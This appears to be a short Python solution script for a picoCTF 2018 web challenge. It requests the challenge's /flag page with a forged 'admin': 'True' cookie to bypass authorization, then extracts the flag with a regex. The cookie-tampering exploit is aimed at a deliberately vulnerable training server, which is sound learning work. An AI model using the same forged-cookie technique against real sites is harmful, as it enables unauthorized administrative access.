#!/usr/bin/python

import requests
import re

params = {'user': 'test', 'password': 'test', 'submit': 'Sign In'}
jar = {'admin': 'True'}

r = requests.get('http://2018shell1.picoctf.com:37861/flag', data=params, cookies=jar)
source = r.text
print re.findall(r'(picoCTF\{.+\})', source)[0]
